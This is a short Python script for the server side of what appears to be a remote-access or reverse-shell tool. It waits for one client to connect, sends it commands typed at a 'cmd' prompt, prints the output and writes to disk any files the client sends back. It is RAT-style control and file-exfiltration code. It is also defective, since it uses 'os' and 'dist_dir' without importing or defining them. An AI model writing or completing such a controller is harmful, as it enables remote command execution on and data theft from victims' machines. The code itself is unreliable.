import socket
import click

BUFFER_FILE = 1024 * 3333
BUFFER_INFO = 1024 * 9

# Main server file
def main(HOST, PORT):
    try:
        print(f":: Host = {HOST}")
        print(f":: Port = {PORT}")

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((HOST, PORT))
        server.listen(1)
        print(f":: Listening...")

        client, address = server.accept()
        print(f":: Connected with {address}\n")

        while True:
            command = click.prompt("cmd")
            client.send(command.encode())

            response = client.recv(BUFFER_INFO).decode()
            match response:
                case "<FILE>":
                    Handle_File(client)
                case "<ERRO>":
                    print(f'--Error')
                case "<SCCS>":
                    print(f'--Success')
                case _:
                    print(f"⚡: {response}")
    except Exception as e:
        print(e)


def Handle_File(sock):
    name = sock.recv(BUFFER_INFO).decode()
    data = sock.recv(BUFFER_FILE)

    with open(os.path.join(dist_dir, name), "wb") as file:
        file.write(data)
